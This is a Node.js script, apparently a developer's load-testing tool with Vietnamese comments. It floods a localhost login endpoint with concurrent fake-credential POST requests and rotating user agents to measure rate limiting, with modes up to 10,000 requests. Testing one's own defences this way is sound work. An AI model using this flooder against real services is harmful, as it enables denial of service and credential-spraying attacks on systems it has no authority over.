/**
 * DDoS Login Attack Simulator
 * Mô phỏng tấn công DDoS vào endpoint /api/users/login
 * 
 * CẢNH BÁO: Chỉ sử dụng cho mục đích testing và giáo dục!
 */

import axios from 'axios';

// ================== CONFIGURATION ==================
const CONFIG = {
    TARGET_URL: 'http://localhost:1000/api/users/login',
    CONCURRENT_REQUESTS: 10,        // Số request đồng thời
    TOTAL_REQUESTS: 100,             // Tổng số request
    DELAY_BETWEEN_BATCHES: 100,      // ms giữa các batch
    TIMEOUT: 5000,                   // ms timeout cho mỗi request
};

// ================== FAKE DATA ==================
const FAKE_CREDENTIALS = [
    { email: 'admin@example.com', password: 'admin123' },
    { email: 'user@example.com', password: 'user123' },
    { email: 'test@test.com', password: 'test123' },
    { email: 'hacker@evil.com', password: 'password' },
    { email: 'attacker@ddos.com', password: '123456' },
];

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)',
    'PostmanRuntime/7.26.8',
];

// ================== STATISTICS ==================
const stats = {
    total: 0,
    success: 0,
    failed: 0,
    rateLimited: 0,
    timeout: 0,
    errors: {},
    responseTimes: [],
    startTime: 0,
    endTime: 0,
};

// ================== HELPER FUNCTIONS ==================
function getRandomCredential() {
    return FAKE_CREDENTIALS[Math.floor(Math.random() * FAKE_CREDENTIALS.length)];
}

function getRandomUserAgent() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ================== ATTACK FUNCTION ==================
async function sendLoginRequest() {
    const credential = getRandomCredential();
    const userAgent = getRandomUserAgent();
    const startTime = Date.now();

    try {
        const response = await axios.post(
            CONFIG.TARGET_URL,
            credential,
            {
                headers: {
                    'User-Agent': userAgent,
                    'Content-Type': 'application/json',
                },
                timeout: CONFIG.TIMEOUT,
            }
        );

        const responseTime = Date.now() - startTime;
        stats.responseTimes.push(responseTime);
        stats.success++;

        return {
            status: 'success',
            statusCode: response.status,
            responseTime,
        };

    } catch (error) {
        const responseTime = Date.now() - startTime;

        if (error.code === 'ECONNABORTED' || error.code === 'ETIMEDOUT') {
            stats.timeout++;
            return { status: 'timeout', responseTime };
        }

        if (error.response) {
            const statusCode = error.response.status;

            if (statusCode === 429) {
                stats.rateLimited++;
                return {
                    status: 'rate-limited',
                    statusCode,
                    responseTime,
                    message: error.response.data?.message || 'Too Many Requests'
                };
            }

            stats.failed++;
            const errorKey = `HTTP_${statusCode}`;
            stats.errors[errorKey] = (stats.errors[errorKey] || 0) + 1;

            return {
                status: 'failed',
                statusCode,
                responseTime,
                message: error.response.data?.message || error.message
            };
        }

        stats.failed++;
        const errorKey = error.code || 'UNKNOWN_ERROR';
        stats.errors[errorKey] = (stats.errors[errorKey] || 0) + 1;

        return {
            status: 'error',
            responseTime,
            error: error.message
        };
    } finally {
        stats.total++;
    }
}

// ================== BATCH ATTACK ==================
async function runBatchAttack(batchSize) {
    const promises = [];

    for (let i = 0; i < batchSize; i++) {
        promises.push(sendLoginRequest());
    }

    return await Promise.allSettled(promises);
}

// ================== MAIN ATTACK ==================
async function startAttack() {
    console.log('\nDDoS LOGIN ATTACK SIMULATOR');
    console.log(`Target: ${CONFIG.TARGET_URL}`);
    console.log(`Total Requests: ${CONFIG.TOTAL_REQUESTS}`);
    console.log(`Concurrent: ${CONFIG.CONCURRENT_REQUESTS}`);
    console.log(`Delay: ${CONFIG.DELAY_BETWEEN_BATCHES}ms\n`);

    stats.startTime = Date.now();

    const totalBatches = Math.ceil(CONFIG.TOTAL_REQUESTS / CONFIG.CONCURRENT_REQUESTS);

    for (let batch = 0; batch < totalBatches; batch++) {
        const remaining = CONFIG.TOTAL_REQUESTS - stats.total;
        const batchSize = Math.min(CONFIG.CONCURRENT_REQUESTS, remaining);

        process.stdout.write(`\rAttacking... [${stats.total}/${CONFIG.TOTAL_REQUESTS}]`);

        await runBatchAttack(batchSize);

        if (stats.total < CONFIG.TOTAL_REQUESTS) {
            await sleep(CONFIG.DELAY_BETWEEN_BATCHES);
        }
    }

    stats.endTime = Date.now();
    printResults();
}

// ================== RESULTS ==================
function printResults() {
    const duration = (stats.endTime - stats.startTime) / 1000;
    const avgResponseTime = stats.responseTimes.length > 0
        ? (stats.responseTimes.reduce((a, b) => a + b, 0) / stats.responseTimes.length).toFixed(2)
        : 0;
    const requestsPerSecond = (stats.total / duration).toFixed(2);

    console.log('\n\n========== RESULTS ==========');
    console.log(`Duration: ${duration.toFixed(2)}s`);
    console.log(`Total: ${stats.total}`);
    console.log(`Success: ${stats.success} (${((stats.success / stats.total) * 100).toFixed(2)}%)`);
    console.log(`Failed: ${stats.failed} (${((stats.failed / stats.total) * 100).toFixed(2)}%)`);
    console.log(`Rate Limited: ${stats.rateLimited} (${((stats.rateLimited / stats.total) * 100).toFixed(2)}%)`);
    console.log(`Timeout: ${stats.timeout} (${((stats.timeout / stats.total) * 100).toFixed(2)}%)`);
    console.log(`Avg Response: ${avgResponseTime}ms`);
    console.log(`Speed: ${requestsPerSecond} req/s`);

    if (Object.keys(stats.errors).length > 0) {
        console.log(`\nErrors:`);
        for (const [error, count] of Object.entries(stats.errors)) {
            console.log(`  ${error}: ${count}`);
        }
    }

    const blocked = stats.rateLimited + stats.failed;
    const blockRate = ((blocked / stats.total) * 100).toFixed(2);
    console.log(`\nBlocked: ${blocked} (${blockRate}%)`);
    console.log('=============================\n');
}

// ================== USAGE MODES ==================
const MODES = {
    LIGHT: {
        CONCURRENT_REQUESTS: 5,
        TOTAL_REQUESTS: 50,
        DELAY_BETWEEN_BATCHES: 200,
    },
    MODERATE: {
        CONCURRENT_REQUESTS: 10,
        TOTAL_REQUESTS: 100,
        DELAY_BETWEEN_BATCHES: 100,
    },
    HEAVY: {
        CONCURRENT_REQUESTS: 20,
        TOTAL_REQUESTS: 200,
        DELAY_BETWEEN_BATCHES: 50,
    },
    EXTREME: {
        CONCURRENT_REQUESTS: 50,
        TOTAL_REQUESTS: 500,
        DELAY_BETWEEN_BATCHES: 10,
    },
    MASSIVE: {
        CONCURRENT_REQUESTS: 100,
        TOTAL_REQUESTS: 10000,
        DELAY_BETWEEN_BATCHES: 5,
    },
};

// ================== CLI INTERFACE ==================
const mode = process.argv[2] || 'moderate';

if (mode === 'help' || mode === '--help' || mode === '-h') {
    console.log(`
DDoS Login Attack Simulator

Usage: node ddos-login-attack.js [mode]

Modes:
  light      - 5 concurrent, 50 total requests
  moderate   - 10 concurrent, 100 total requests (default)
  heavy      - 20 concurrent, 200 total requests
  extreme    - 50 concurrent, 500 total requests
  massive    - 100 concurrent, 10000 total requests ⚠️  DANGER

Examples:
  node ddos-login-attack.js light
  node ddos-login-attack.js moderate
  node ddos-login-attack.js extreme
  node ddos-login-attack.js massive
    `);
    process.exit(0);
}

if (MODES[mode.toUpperCase()]) {
    Object.assign(CONFIG, MODES[mode.toUpperCase()]);
    console.log(`\nMode: ${mode.toUpperCase()}\n`);
}

// ================== RUN ATTACK ==================
startAttack().catch(err => {
    console.error('\n❌ Fatal error:', err.message);
    process.exit(1);
});
